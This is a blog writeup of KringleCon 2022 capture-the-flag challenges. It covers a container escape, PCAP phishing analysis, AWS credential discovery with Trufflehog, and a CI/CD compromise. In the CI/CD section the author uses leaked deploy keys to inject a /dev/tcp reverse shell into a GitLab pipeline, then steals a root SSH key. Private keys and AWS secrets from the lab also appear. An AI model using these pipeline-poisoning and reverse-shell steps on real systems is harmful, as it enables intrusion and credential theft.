<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>Kringlecon 2022 Writeup - lavafroth</title><meta name=description content='This writeup is rather haphazard as I jumped around from one place to another
solving different unrelated challenges. Although the writeup covers all the
challenges, it definitely is not sequential. Just wanted to point that out
before diving in.
Clone with a Difference
This challenge wants us to clone a git repository. It&rsquo;s using git with ssh for
cloning which doesn&rsquo;t seem to work.
git clone git@haugfactory.com:asnowball/aws_scripts.git
We can clone this the HTTPS way:'><meta name=author content><link rel="preload stylesheet" as=style href=https://lavafroth.is-a.dev/app.min.css><link rel=preload as=image href=../../header.svg><link as=font href=https://lavafroth.is-a.dev/latinmodern-math.otf><link rel=preload as=image href=https://lavafroth.is-a.dev/github.svg><link rel=preload as=image href=https://lavafroth.is-a.dev/about.svg><link rel=preload as=image href=https://lavafroth.is-a.dev/art.svg><link rel=preload as=image href=https://lavafroth.is-a.dev/rss.svg><link rel=icon href=https://lavafroth.is-a.dev/favicon.png><link rel=blog-icon href=https://lavafroth.is-a.dev/icon.png></head><body><header><a class=site-name href=https://lavafroth.is-a.dev/><svg viewBox="0 0 8790 2400"><path d="M80 1935V465h216v1270h286v2e2zm853 0 222-1470h264l222 1470h-210l-40-3e2h-208l-40 3e2zm280-528h148l-62-494-6-78h-12l-6 78zm1025 528L2014 465h210l108 868 8 142h12l8-142 108-868h210l-224 1470zm813 0 222-1470h264l222 1470h-210l-40-3e2h-208l-40 3e2zm280-528h148l-62-494-6-78h-12l-6 78zm851 528V465h514v222h-298v386h2e2v222h-2e2v640zm910 0V465h216q194 0 286 108 92 107 92 316 0 124-43 215-44 90-106 132l147 699h-216l-122-620h-38v620zm216-820q60 0 95-26 35-27 50-76t15-116q0-105-34-161-35-57-126-57zm1084 836q-90 0-154-42-65-42-99-114-35-72-35-162V767q0-91 35-162 34-72 99-114 64-42 154-42t155 42q64 42 99 114 34 72 34 162v866q0 90-34 162-35 72-99 114-65 42-155 42zm0-210q40 0 56-33 16-34 16-75V767q0-41-17-74-17-34-55-34-37 0-54 34-18 33-18 74v866q0 41 17 75 17 33 55 33zm890 194V687h-204V465h624v222h-204v1248zm828 0V465h216v608h168V465h216v1470h-216v-640h-168v640z"/></svg></a><nav><a style=--url:url(./github.svg) href=https://github.com/lavafroth aria-label=github target=_blank></a><a href=../../about/ aria-label=about style=--url:url(./about.svg)></a><a href=../../art/ aria-label=art style=--url:url(./art.svg)></a><a href=../../index.xml aria-label=rss style=--url:url(./rss.svg)></a><nav></header><main><article class=post-single data-pagefind-body><hgroup><p data-pagefind-ignore><time>Jan 9, 2023 | 30 minutes read</time></p><h1 data-pagefind-meta=title>Kringlecon 2022 Writeup</h1></hgroup><section class=post-content><p>This writeup is rather haphazard as I jumped around from one place to another
solving different unrelated challenges. Although the writeup covers all the
challenges, it definitely is not sequential. Just wanted to point that out
before diving in.</p><h3 id=clone-with-a-difference>Clone with a Difference</h3><p>This challenge wants us to clone a git repository. It&rsquo;s using git with ssh for
cloning which doesn&rsquo;t seem to work.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>git clone git@haugfactory.com:asnowball/aws_scripts.git
</span></span></code></pre></div><p>We can clone this the HTTPS way:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>git clone https://haugfactory.com/asnowball/aws_scripts.git
</span></span></code></pre></div><p>The challenge asks us to enter the last word of the readme. We can get that by
reading the last line, replacing the spaces with newlines and then reading the
last line of that output (effectively the last word).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>tail -n1 README.md | sed <span style=color:#e6db74>&#39;s/ /\n/g&#39;</span> | tail -n1
</span></span></code></pre></div><pre tabindex=0><code>maintainers.
</code></pre><p>Now we run the following to submit the word.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>runtoanswer maintainers
</span></span></code></pre></div><h3 id=prison-escape>Prison Escape</h3><p>We are dropped into a docker container evident by the presence of the
<code>/.dockerenv</code> file. Running <code>sudo -l</code> tells us that we can run any command as
the superuser (using <code>sudo</code>) without supplying a password.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>sudo -l
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>User samways may run the following commands on grinchum-land:
</span></span><span style=display:flex><span>    (ALL) NOPASSWD: ALL
</span></span></code></pre></div><p>We will run <code>sudo -s</code> to escalate our privileges to <code>root</code>.
Let&rsquo;s inspect what disks we have available by executing <code>fdisk -l</code>.</p><pre tabindex=0><code>Disk /dev/vda: 2048 MB, 2147483648 bytes, 4194304 sectors
2048 cylinders, 64 heads, 32 sectors/track
Units: sectors of 1 * 512 = 512 bytes

Disk /dev/vda doesn&#39;t contain a valid partition table
</code></pre><p>This <code>vda</code> device may point to the host filesystem. So it&rsquo;s worth mounting and
exploring. We run the following to create a mountpoint and subsequently
mounting the volume:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>mkdir -p /mnt/vda <span style=color:#f92672>&amp;&amp;</span> mount /dev/vda /mnt/vda
</span></span></code></pre></div><p>Upon changing directory to <code>/mnt/vda</code>, we can indeed explore the host
filesystem. The challenge introduction talked something about keys:</p><blockquote><p>Please, do your best to un-contain yourself and find the keys to both of your freedom.</p></blockquote><p>Let&rsquo;s look for files that have the word &ldquo;key&rdquo; in them:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>find /mnt/vda -name <span style=color:#e6db74>&#34;*key*&#34;</span> 2&gt;/dev/null
</span></span></code></pre></div><p>Among the files listed, we can find <code>/mnt/vda/home/jailer/.ssh/jail.key.priv</code> whose contents can be listed by running:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>cat /mnt/vda/home/jailer/.ssh/jail.key.priv
</span></span></code></pre></div><p>This gives us the key <code>082bb339ec19de4935867</code> which can be submitted in our objectives section.</p><h3 id=wireshark-phishing>Wireshark Phishing</h3><p>We begin by saying <code>yes</code> to the challenge, downloading the PCAP file and opening it up in wireshark.
The following are the questions, their answers and explanations.</p><ol><li><p>There are objects in the PCAP file that can be exported by Wireshark and/or Tshark. What type of objects can be exported from this PCAP?</p><p>Answer: HTTP</p><p>Explanation: We can go to <code>File</code> > <code>Export Objects</code> > <code>HTTP ...</code></p></li></ol><p><img src=../../kringlecon/2022/export-http-objects.png alt="Exporting HTTP objects"></p><ol start=2><li><p>What is the file name of the largest file we can export?</p><p>Answer: <code>app.php</code></p><p>Explanation: In the export objects dialog, we notice the second entry with the largest size (808 kB) has the name <code>app.php</code></p></li></ol><p><img src=../../kringlecon/2022/Screenshot-from-2022-12-11-20-19-50.png alt=Screenshot-from-2022-12-11-20-19-50.png></p><ol start=3><li><p>What packet number starts that app.php file?</p><p>Answer: 687</p><p>Explanation: Right before the entry&rsquo;s name, we see it starts from packet 687</p></li><li><p>What is the IP of the Apache server?</p><p>Answer: <code>192.185.57.242</code></p><p>Explanation: We use the <code>http</code> filter in wireshark. We notice right at the first filtered entry, a GET request goes to <code>192.185.57.242</code></p></li></ol><p><img src=../../kringlecon/2022/Screenshot-from-2022-12-11-20-21-06.png alt=Screenshot-from-2022-12-11-20-21-06.png></p><ol start=5><li><p>What file is saved to the infected host?</p><p>Answer: Ref_Sept24-2020.zip</p><p>Explanation: At packet 687, we can inspect the line-based text data for the HTTP response and the embedded script seems to save a blob to the file &lsquo;Ref_Sept24-2020.zip&rsquo;.</p></li></ol><p><img src=../../kringlecon/2022/Screenshot-from-2022-12-11-20-23-02.png alt=Screenshot-from-2022-12-11-20-23-02.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#75715e>// --{snip}--
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>byteNumbers</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Array(<span style=color:#a6e22e>byteCharacters</span>.<span style=color:#a6e22e>length</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>byteCharacters</span>.<span style=color:#a6e22e>length</span>; <span style=color:#a6e22e>i</span><span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>byteNumbers</span>[<span style=color:#a6e22e>i</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>byteCharacters</span>.<span style=color:#a6e22e>charCodeAt</span>(<span style=color:#a6e22e>i</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>byteArray</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Uint8Array</span>(<span style=color:#a6e22e>byteNumbers</span>);
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e>// now that we have the byte array, construct the blob from it
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>blob1</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Blob</span>([<span style=color:#a6e22e>byteArray</span>], {<span style=color:#a6e22e>type</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;application/octet-stream&#39;</span>});
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>saveAs</span>(<span style=color:#a6e22e>blob1</span>, <span style=color:#e6db74>&#39;Ref_Sept24-2020.zip&#39;</span>);
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>})();
</span></span><span style=display:flex><span><span style=color:#75715e>// --{snip}--
</span></span></span></code></pre></div><ol start=6><li><p>Attackers used bad TLS certificates in this traffic. Which countries were they registered to? Submit the names of the countries in alphabetical order separated by a commas (Ex: Norway, South Korea).</p><p>Answer: Ireland, Israel, South Sudan, United States</p><p>Explanation: This time, we&rsquo;ll use <code>tshark</code> because we don&rsquo;t want to manually skim through a bunch of packets.</p></li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>tshark -r suspicious.pcap -Y <span style=color:#e6db74>&#34;tls.handshake.certificate&#34;</span> -T fields -e x509sat.CountryName | sed <span style=color:#e6db74>&#39;s/,/\n/g&#39;</span> | sort -u
</span></span></code></pre></div><p>Here&rsquo;s how the above command works:</p><ul><li>The <code>-Y</code> flag specifies the wireshark filter of <code>tls.handshake.certificate</code></li><li><code>-T fields -e x509sat.CountryName</code> extracts the country names from the certificates.</li><li>We pipe through <code>sed</code> to split comma separated values into individual lines</li><li>Finally, <code>sort -u</code> to sort the unique items.</li></ul><p>This results in:</p><pre tabindex=0><code>IE
IL
SS
US
</code></pre><p>If we look up the country codes at <a href=https://country-code.cl>https://country-code.cl</a>, we get our answer <code>Ireland, Israel, South Sudan, United States</code>.</p><ol start=7><li><p>Is the host infected (Yes/No)?</p><p>Answer: Yes</p><p>Explanation: With the DNS requests for <code>wpad.localdomain</code> (like in packet 4792) from our host, we can confirm that an active directory exploit (the web proxy auto-discovery exploit probably using responder) is running. It&rsquo;s probably the malware that just dropped.</p></li></ol><h3 id=jolly-cicd>Jolly CI/CD</h3><p>We are dropped into a container environment as the user <code>samways</code>. If we talk to Tinsel Upatree, he tells us about a repository he accidentally committed to:</p><p><img src=../../kringlecon/2022/Screenshot-from-2022-12-09-14-16-18.png alt=Screenshot-from-2022-12-09-14-16-18.png></p><blockquote><p>WHOOPS! I didn&rsquo;t mean to commit that to <a href=http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git>http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git</a></p></blockquote><p>We will try to clone this repository.</p><blockquote><p>Note: This gitlab endpoint takes some time to start. I was unaware of this phenomenon and discarded the host as something of interest once git was unable to resolve this host.</p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal
</span></span></code></pre></div><p>Inside this directory, let&rsquo;s inspect the git history by running <code>git log</code>. A few commits deep, we see one titled &ldquo;whoops&rdquo;</p><pre tabindex=0><code>commit e19f653bde9ea3de6af21a587e41e7a909db1ca5
Author: knee-oh &lt;sporx@kringlecon.com&gt;
Date:   Tue Oct 25 13:42:54 2022 -0700

    whoops
</code></pre><p>Let&rsquo;s see what blunder was committed:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>git diff-tree -p e19f653bde9ea3de6af21a587e41e7a909db1ca5
</span></span></code></pre></div><pre tabindex=0><code>diff --git a/.ssh/.deploy b/.ssh/.deploy
deleted file mode 100644
index 3f7a9e3..0000000
--- a/.ssh/.deploy
+++ /dev/null
@@ -1,7 +0,0 @@
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
-QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
-9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
-AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
-PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
------END OPENSSH PRIVATE KEY-----
diff --git a/.ssh/.deploy.pub b/.ssh/.deploy.pub
deleted file mode 100644
index 8c0b43c..0000000
--- a/.ssh/.deploy.pub
+++ /dev/null
@@ -1 +0,0 @@
-ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP7AsdI7HOvk4piOcwLZfDotPqBj2tDq9NBdTUkbZBri sporx@kringlecon.com
</code></pre><p>We see that the author removed a private and public key-pair. These are the files <code>.ssh/.deploy</code> and <code>.ssh/.deploy.pub</code>. We will reset the repository to the commit before this one to see the files.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>git reset --hard abdea0ebb21b156c01f7533cea3b895c26198c98
</span></span></code></pre></div><p>Let&rsquo;s copy this <code>.ssh</code> directory to our home.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>cp -r .ssh/ ~
</span></span></code></pre></div><p>Let&rsquo;s also not forget imposing the correct permissions on the private key.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>chmod <span style=color:#ae81ff>600</span> ~/.ssh/.deploy
</span></span></code></pre></div><p>We will make a config file in the <code>~/.ssh</code> directory so that the deploy keys are used when connecting to the internal gitlab endpoint. We write the following to <code>~/.ssh/config</code>:</p><pre tabindex=0><code>Host gitlab.flag.net.internal
  HostName gitlab.flag.net.internal
  User git
  IdentityFile ~/.ssh/.deploy
</code></pre><p>We will backup whatever we had cloned initially.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>cd ..
</span></span><span style=display:flex><span>mv wordpress.flag.net.internal/ bak
</span></span></code></pre></div><p>Let&rsquo;s clone the repository using the SSH keys. This way we will be able to impersonate as the author and push any changes made to the repository.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>git clone ssh://git@gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
</span></span></code></pre></div><p>There&rsquo;s a <code>.gitlab-ci.yml</code> that looks like the following:</p><pre tabindex=0><code>deploy-job:      
  stage: deploy 
  environment: production
  script:
    - rsync -e &#34;ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy&#34; --chown=www-data:www-data -atv --delete --progress ./ root@wordpress.flag.net.internal:/var/www/html
</code></pre><p>We will now append the following line to it:</p><pre tabindex=0><code>    - sh -i &gt;&amp; /dev/tcp/172.18.0.99/9001 0&gt;&amp;1
</code></pre><p>This adds a script under the deploy jobs that starts a reverse shell back to us. Since we need to start a listener in a separate terminal, we will run <code>tmux</code>. Let&rsquo;s start listening for the reverse shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>nc -lvp <span style=color:#ae81ff>9001</span>
</span></span></code></pre></div><p>In another pane, created by pressing <code>^b</code> and <code>"</code>, we commit and push the changes we made.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>git config user.name <span style=color:#e6db74>&#34;foo&#34;</span>
</span></span><span style=display:flex><span>git config user.email <span style=color:#e6db74>&#34;foo@bar.baz&#34;</span>
</span></span><span style=display:flex><span>git commit -am <span style=color:#e6db74>&#34;update&#34;</span>
</span></span><span style=display:flex><span>git push
</span></span></code></pre></div><p>Bam! We get a connection back.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>&lt;ziL/0/rings-of-powder/wordpress.flag.net.internal# cd
</span></span><span style=display:flex><span>gitlab-runner:~#
</span></span></code></pre></div><p>We had earlier observed from the repository&rsquo;s <code>.gitlab-ci.yml</code> that the runner has an SSH private key at <code>/etc/gitlab-runner/hhc22-wordpress-deploy</code> that is used to log into the <code>wordpress.flag.net.internal</code> endpoint as <code>root</code>. Let&rsquo;s quickly grab it through our reverse shell (Press <code>^b</code>, <code>↑</code> to switch to the reverse shell pane).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>cat /etc/gitlab-runner/hhc22-wordpress-deploy
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>-----BEGIN OPENSSH PRIVATE KEY-----
</span></span><span style=display:flex><span>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
</span></span><span style=display:flex><span>QyNTUxOQAAACD8EYdZTOpf5REuWXMb9FKCFWoiIX2HoU1aH90V0Ptq3wAAAJiMXr0BjF69
</span></span><span style=display:flex><span>AQAAAAtzc2gtZWQyNTUxOQAAACD8EYdZTOpf5REuWXMb9FKCFWoiIX2HoU1aH90V0Ptq3w
</span></span><span style=display:flex><span>AAAEBtNE6sqOFoqkmOhcB/9DgzaQhQRC/bwkAbsBXwqrt/mPwRh1lM6l/lES5Zcxv0UoIV
</span></span><span style=display:flex><span>aiIhfYehTVof3RXQ+2rfAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
</span></span><span style=display:flex><span>-----END OPENSSH PRIVATE KEY-----
</span></span></code></pre></div><p>We&rsquo;ll copy this to our clipboard, terminate our reverse shell and paste it to a file called <code>key</code>. Finally, we correct the permissions on it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>chmod <span style=color:#ae81ff>600</span> key
</span></span></code></pre></div><p>Now we can SSH into the production server.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>ssh -i key root@wordpress.flag.net.internal
</span></span></code></pre></div><p>We can now read the flag.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>cat /flag.txt
</span></span></code></pre></div><pre tabindex=0><code>Congratulations! You&#39;ve found the HHC2022 Elfen Ring!

--{snip}--

oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT

--{snip}--
</code></pre><p>Well! Wasn&rsquo;t that one heck of a ride? All that&rsquo;s left is to submit the flag.</p><hr><h4 id=a-brief-intermission>A brief intermission</h4><p>The next thing I did was something any sane pentester does after solving a 5/5 difficulty challenge. That&rsquo;s right, I bought a hat. First we go to the vending machine in the Burning Ring of Fire area. I went to a nearby KTM (KringleCoin Teller Machine) and approved a transaction to <code>0x4274115D3C76f9b2a5C155FF747d50C09cE839f9</code> and used Hat ID <code>175</code> at the kiosk to complete my purchase. This inadvertently completed the <strong>Buy a hat</strong> objective which means you probably should buy a hat too. Sweet beanie, onward!</p><hr><h3 id=aws-cli-intro>AWS CLI Intro</h3><p>The first question asks us to run <code>aws help</code> to get us acquainted with the basics.
Next, we are asked to configure the default aws cli credentials with the access key <code>AKQAAYRKO7A5Q5XUY2IY</code>, the secret key <code>qzTscgNdcdwIo/soPKPoJn9sBrl5eMQQL19iO5uf</code> and the region <code>us-east-1</code>. We will run</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>aws configure
</span></span></code></pre></div><p>and enter the details.</p><pre tabindex=0><code>AWS Access Key ID [None]: AKQAAYRKO7A5Q5XUY2IY
AWS Secret Access Key [None]: qzTscgNdcdwIo/soPKPoJn9sBrl5eMQQL19iO5uf
Default region name [None]: us-east-1
Default output format [None]: 
</code></pre><p>To finish, we are asked to get our caller identity using the AWS command line.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>aws sts get-caller-identity
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;UserId&#34;</span>: <span style=color:#e6db74>&#34;AKQAAYRKO7A5Q5XUY2IY&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;Account&#34;</span>: <span style=color:#e6db74>&#34;602143214321&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;Arn&#34;</span>: <span style=color:#e6db74>&#34;arn:aws:iam::602143214321:user/elf_helpdesk&#34;</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>That completes the introduction.</p><h3 id=exploitation-via-aws-cli>Exploitation via AWS CLI</h3><p>We are asked to do the following:</p><blockquote><p>Use Trufflehog to find credentials in the Gitlab instance at <a href=https://haugfactory.com/asnowball/aws_scripts.git>https://haugfactory.com/asnowball/aws_scripts.git</a>.
Configure these credentials for us-east-1 and then run: aws sts get-caller-identity</p></blockquote><p>Let&rsquo;s clone the repository and change directories into it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>git clone https://haugfactory.com/asnowball/aws_scripts.git
</span></span><span style=display:flex><span>cd aws_scripts
</span></span></code></pre></div><p>We will run trufflehog and point it to the git repository like so:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>trufflehog git https://haugfactory.com/asnowball/aws_scripts.git
</span></span></code></pre></div><pre tabindex=0><code># --{snip}--

Found unverified result 🐷🔑❓
Detector Type: AWS
Decoder Type: PLAIN
Raw result: AKIAAIDAYRANYAHGQOHD
Commit: 106d33e1ffd53eea753c1365eafc6588398279b5
File: put_policy.py
Email: asnowball &lt;alabaster@northpolechristmastown.local&gt;
Repository: https://haugfactory.com/asnowball/aws_scripts.git
Timestamp: 2022-09-07 07:53:12 -0700 -0700
Line: 6

# --{snip}--
</code></pre><p>Trufflehog has discovered an AWS key in the file <code>put_policy.py</code> for the commit hash <code>106d33e1ffd53eea753c1365eafc6588398279b5</code>. One of the objectives named <strong>Trufflehog Search</strong> asks for the file where the credentials are found. We will submit <code>put_policy.py</code> there.</p><p>Let&rsquo;s reset to that commit and inspect the <code>put_policy.py</code> file.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>git reset --hard 106d33e1ffd53eea753c1365eafc6588398279b5
</span></span><span style=display:flex><span>cat put_policy.py
</span></span></code></pre></div><p>We get the key and the secret.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#75715e># --{snip}--</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    aws_access_key_id<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;AKIAAIDAYRANYAHGQOHD&#34;</span>,
</span></span><span style=display:flex><span>    aws_secret_access_key<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;e95qToloszIgO9dNBsQMQsc5/foiPdKunPJwc1rL&#34;</span>,
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># --{snip}--</span>
</span></span></code></pre></div><p>Now we run <code>aws configure</code> and supply the credentials.</p><pre tabindex=0><code>AWS Access Key ID [None]: AKIAAIDAYRANYAHGQOHD
AWS Secret Access Key [None]: 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
Default region name [None]: us-east-1
Default output format [None]: 
</code></pre><p>Now to get our caller identity.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>aws sts get-caller-identity
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;UserId&#34;</span>: <span style=color:#e6db74>&#34;AIDAJNIAAQYHIAAHDDRA&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;Account&#34;</span>: <span style=color:#e6db74>&#34;602123424321&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;Arn&#34;</span>: <span style=color:#e6db74>&#34;arn:aws:iam::602123424321:user/haug&#34;</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>We are told that managed (shared) policies can be attached to multiple users. The next task is to use the AWS CLI to find any policies attached to our user.</p><p>We will use the <code>list-attached-user-policies</code> subcommand of the <code>aws iam</code> command. We have to supply our username (<code>haug</code>, as apparent from the value of the <code>Arn</code> field) through the <code>--user-name</code> flag.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>aws iam list-attached-user-policies --user-name haug
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;AttachedPolicies&#34;</span>: [
</span></span><span style=display:flex><span>        {
